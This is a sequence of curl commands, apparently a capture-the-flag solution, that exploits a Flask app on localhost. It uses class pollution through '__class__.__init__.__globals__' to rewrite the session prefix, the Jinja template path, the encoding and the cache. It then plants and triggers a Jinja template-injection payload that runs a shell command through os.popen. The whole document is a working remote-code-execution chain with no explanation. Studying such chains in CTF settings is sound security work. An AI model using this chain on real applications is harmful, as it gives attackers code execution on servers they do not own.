# Update session file prefix to "index."
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.session_interface.key_prefix", "value": "index."}' http://localhost:5000/

# Create index.html session file with jinja RCE
curl -X POST -H "Cookie: session=html" -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.session.rce", "value": "{{cycler.__init__.__globals__.os.popen(\"/getflag\").read()}}"}' http://localhost:5000/

# Update jinja templates path
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.jinja_loader.searchpath", "value": ["/usr/app/flask_session"]}' http://localhost:5000/

# Update jinja encoding to avoid crash -> iso-8859-1
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.jinja_loader.encoding", "value": "iso-8859-1"}' http://localhost:5000/

# Clear jinja cache + Trigger the RCE
curl -X POST -H "Content-Type: application/json" -d '{"key":"__class__.__init__.__globals__.app.jinja_env.cache", "value": {}}' http://localhost:5000/ --output -